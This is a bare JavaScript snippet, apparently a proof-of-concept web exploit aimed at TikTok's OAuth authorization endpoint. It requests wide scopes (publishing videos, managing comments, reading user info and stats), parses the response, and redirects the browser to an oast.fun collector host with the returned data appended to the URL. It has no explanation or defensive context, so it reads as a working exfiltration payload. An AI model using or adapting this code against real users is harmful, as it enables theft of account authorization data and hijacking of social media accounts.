var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=comment.list,video.publish,user.account.type,user.info.username,user.insights,user.info.basic,video.list,video.insights,comment.list.manage,user.info.stats&aid=1459&source=web&redirect_uri=https://tiktok.com/', true);
xhr.setRequestHeader('Content-type', 'application/json');
xhr.onload = () => {
    const data = JSON.parse(xhr.responseText);
var imran= (JSON.stringify(data));
location.replace("http://bartqtkbajnhmsotmlzp4q9wse2zlm1lp.oast.fun/?DATA=" + imran );
};
xhr.send('{}');